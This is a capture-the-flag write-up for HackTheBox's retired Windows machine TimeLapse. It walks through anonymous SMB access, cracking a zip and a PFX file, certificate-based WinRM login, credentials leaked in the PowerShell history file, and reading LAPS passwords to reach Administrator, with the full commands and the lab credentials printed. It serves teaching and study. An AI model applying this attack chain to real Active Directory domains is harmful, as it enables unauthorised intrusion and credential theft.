# TimeLapse

```
Platform    : HackTheBox
OS          : Windows
Difficulty  : Easy
Category    : Active Directory / SMB / LAPS
IP          : 10.129.227.113
```

---

## Summary

Initial access was gained through an anonymously-readable SMB share
containing a password-protected backup archive. Cracking the archive,
and then the PKCS#12 certificate bundle inside it, yielded a client
certificate that authenticated over WinRM using certificate-based
Kerberos/TLS auth instead of a username and password. From there,
plaintext credentials for a second, more privileged service account
were found in a PowerShell command history file. That account
belonged to a LAPS-reader group, which exposed the rotating local
Administrator password for the domain controller and allowed a
direct login as Administrator.

---

## Reconnaissance

```
nmap -p- -sS --min-rate 5000 -vvv -Pn --open 10.129.227.113 -oN scan.txt
nmap -p <open_ports> -sCV 10.129.227.113
```

- `-p-` scans all 65535 TCP ports instead of the default top 1000.
- `-sS` performs a SYN ("stealth") scan.
- `--min-rate 5000` forces packets to be sent at a minimum rate of 5000/s to speed up the full sweep.
- `-Pn` skips host discovery, treating the target as up regardless of ICMP response.
- `-sCV` on the follow-up scan runs default NSE scripts (`-sC`) and service/version detection (`-sV`) only against the ports already found open.

Key findings:

- **Port 88** — Kerberos (confirms a Domain Controller)
- **Port 389/636/3268/3269** — LDAP / LDAPS / Global Catalog
- **Port 445/139/135** — SMB / NetBIOS / MSRPC
- **Port 5986** — WinRM over SSL (`wsmans`), with a certificate for `dc01.timelapse.htb`
- **Port 9389** — AD Web Services

The presence of Kerberos, LDAP and a domain name (`timelapse.htb`)
confirmed this as a Windows Active Directory domain controller. The
SSL-only WinRM port (5986, rather than the usual plain 5985) was a
notable detail that later became relevant for authentication.

---

## Enumeration

### SMB shares

```
smbclient -L //10.129.227.113 -N
```

- `-L` lists the available shares on the target.
- `-N` suppresses the password prompt and attempts a null (anonymous) session.

This revealed a non-default share called `Shares`, accessible without
credentials:

```
smbclient //10.129.227.113/Shares
```

Browsing it led to a `Dev` folder containing a backup archive:

```
cd Dev
get winrm_backup.zip
```

- `get` downloads the remote file to the local working directory.

---

## Foothold

### Cracking the archive and certificate

The zip was password-protected:

```
unzip winrm_backup.zip
```

Its hash was extracted and cracked with John the Ripper:

```
zip2john winrm_backup.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- `zip2john` converts the zip's encryption metadata into a crackable hash format.
- `john` with `--wordlist` runs a dictionary attack against that hash.

```
winrm_backup.zip : supremelegacy
```

Unzipping it revealed `legacyy_dev_auth.pfx` — a PKCS#12 bundle
containing a certificate and private key — which was itself
password-protected. The same cracking approach was applied:

```
pfx2john legacyy_dev_auth.pfx > pfx_hash.txt
john pfx_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
legacyy_dev_auth.pfx : thuglegacy
```

The certificate and private key were then extracted from the `.pfx`
so they could be used independently:

```
openssl pkcs12 -info -in legacyy_dev_auth.pfx -legacy -nodes
```

- `-info` prints the bundle's contents (certificate and private key) in plaintext, given the correct import password.
- `-legacy` enables compatibility with the older RC2/3DES-based PKCS#12 encryption this file used, which recent OpenSSL versions disable by default.
- `-nodes` outputs the private key unencrypted, without an extra passphrase.

The `-----BEGIN CERTIFICATE-----` and `-----BEGIN PRIVATE KEY-----`
blocks from that output were copied into two separate files,
`cert.pem` and `privatekey.pem`, for direct use as WinRM
authentication material.

### Authenticating with the certificate

Since port 5986 (WinRM over SSL) was open, the certificate could be
used to authenticate directly, without ever needing a plaintext
username/password:

```
evil-winrm -i 10.129.227.113 -c cert.pem -k privatekey.pem -S
```

- `-c` and `-k` supply the client certificate and its matching private key.
- `-S` tells Evil-WinRM to connect over SSL (required for port 5986).

```
whoami
timelapse\legacyy
```

---

## Lateral Movement

Enumerating the `legacyy` profile, PowerShell's command history file
was found to contain credentials used in a prior `Invoke-Command`
test:

```
type C:\Users\legacyy\Appdata\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
```

- PowerShell logs every command a user types to this file by default, which frequently leaks secrets pasted or typed during testing/debugging — a common real-world source of credential leakage.

The file revealed a `PSCredential` object being built in plaintext for
a service account:

```
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

Those credentials authenticated successfully over WinRM:

```
evil-winrm -i 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

```
whoami
timelapse\svc_deploy
```

---

## Privilege Escalation

Group membership for `svc_deploy` was checked:

```
whoami /groups
```

This showed membership in **`TIMELAPSE\LAPS_Readers`** — a custom
group, not a Windows default, indicating deliberate delegation of
LAPS read access.

Belonging to `LAPS_Readers` means the account has explicit permission
to read the domain's LAPS (Local Administrator Password Solution)
attributes. By default, Active Directory hides these attributes from
everyone except explicitly authorized principals; LAPS exists
precisely so that every domain-joined machine gets a unique,
automatically-rotated local Administrator password instead of a
single static one shared across the network. Membership in this
group is effectively the master key to those passwords.

That access was used to query the local Administrator password of the
domain controller directly from Active Directory:

```
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime' | Select-Object Name, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```

- `Get-ADComputer -Filter *` retrieves every computer object in the domain; the filter is unrestricted so all machines are returned.
- `-Properties 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'` explicitly requests two non-default attributes: `ms-Mcs-AdmPwd` is the actual LAPS-managed plaintext password, while `ms-Mcs-AdmPwdExpirationTime` stores when it next rotates. These are hidden from standard queries and only returned to callers with read rights over them.
- `Select-Object` trims the output down to just the computer name and those two attributes, discarding unrelated default fields.

Architecturally, LAPS extends the AD schema with those two attributes
on each computer object. A local agent on each machine periodically
rotates its own local Administrator password and writes the new value
back into its own AD object, protected by an ACL that only permits
specific reader groups — here, `LAPS_Readers` — to view it. This
avoids the classic weakness of a single reused local admin password
across an entire fleet of machines, but it also means that gaining
membership in (or read rights over) that one group is equivalent to
compromising every local Administrator account it covers.

The query returned the domain controller's current password:

```
DC01 : @8+.&F6W;Jo94#e9(9g#pr3N
```

Which was used to authenticate directly as Administrator:

```
evil-winrm -i 10.129.227.113 -u 'Administrator' -p '@8+.&F6W;Jo94#e9(9g#pr3N' -S
```

```
whoami
timelapse\administrator
```

---

## Lessons Learned

- An anonymously-readable SMB share is a classic and still-common
  entry point in AD environments — always check for guest/null
  access before assuming credentials are required.
- Backup archives and certificate bundles (`.zip`, `.pfx`) are worth
  cracking even when password-protected; weak passwords on "internal
  only" backups are common.
- Certificate-based authentication (via `.pfx`/PEM material) is a
  valid and often-overlooked path into WinRM, especially when SSL-only
  WinRM (port 5986) is exposed — it doesn't require a username or
  password at all.
- PowerShell's `ConsoleHost_history.txt` routinely leaks plaintext
  credentials typed during testing or troubleshooting — always check
  it during post-exploitation enumeration of a compromised user.
- Custom AD groups with names suggesting delegated access (like
  `LAPS_Readers`) should be treated as high-value targets: LAPS read
  rights are equivalent to local Administrator access on every
  machine the group can query.

---

<sub>Write-up published after machine retirement, per HackTheBox disclosure policy.</sub>
